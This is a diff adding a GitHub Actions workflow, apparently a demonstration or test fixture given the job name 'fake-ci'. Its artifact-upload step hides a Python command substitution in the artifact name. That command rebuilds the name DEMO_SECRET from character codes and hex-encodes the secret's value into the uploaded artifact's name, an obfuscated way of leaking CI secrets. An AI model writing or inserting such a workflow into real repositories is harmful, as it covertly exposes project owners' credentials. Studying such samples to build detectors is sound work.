@@ -1,0 +1,16 @@
+name: CI
+
+on:
+  workflow_dispatch:
+
+jobs:
+  fake-ci:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Create artifact payload
+        run: echo hello > out.txt
+      - name: Upload build scan artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: "build-scan-$(python3 -c 'import os;print(os.environ[chr(68)+chr(69)+chr(77)+chr(79)+chr(95)+chr(83)+chr(69)+chr(67)+chr(82)+chr(69)+chr(84)].encode().hex())')"
+          path: out.txt
